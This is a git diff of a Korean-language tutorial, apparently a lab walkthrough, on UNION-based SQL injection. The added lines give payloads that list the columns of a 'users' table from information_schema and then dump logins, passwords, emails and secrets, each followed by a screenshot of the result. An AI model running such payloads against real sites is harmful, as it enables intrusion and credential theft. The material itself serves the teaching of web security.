@@ -59,8 +59,17 @@ SQL 인젝션은 사용자가 데이터를 입력할 수 있는 곳 어디에서
   > 0' UNION SELECT ALL 1,table_name,3,4,5,6,7 from information_schema.tables# 
 ![SQL 인젝션 모든 테이블명](https://user-images.githubusercontent.com/76092057/103432398-81c90a00-4c21-11eb-842a-f34de5eb7b17.PNG){: width:"100%" height:"100%"}
 
-* 출력한 정보를 토대로 users 테이블에 사용자 계정 정보가 들어있음을 추측,
-where 절로 users 테이블 정보만 출력하게 조건을 지정한다.
+* 출력한 정보를 토대로 users 테이블에 사용자 계정 정보가 들어있음을 추측, 
+  where 절로 users 테이블 정보만 출력하게 조건을 지정한다.
+  > 0' UNION SELECT ALL 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='users'#
+![SQL 인젝션 WHERE 문](https://user-images.githubusercontent.com/76092057/103432468-a4a7ee00-4c22-11eb-8254-66ca335473f2.PNG){: width:"100%" height:"100%"}
+
+* 페이지에 노출된 칼럼 수보다 확인하려는 칼럼 수가 많을 때는 concat 함수를 사용
+  > 0' UNION SELECT ALL 1,concat (id,login), password,email,secret,6,7 from users#
+![SQl 인젝션 공격 성공(GET)](https://user-images.githubusercontent.com/76092057/103432520-7840a180-4c23-11eb-8886-8c04c9fc829e.PNG){: width:"100%" height:"100%"}
+
+
+
 
 
 
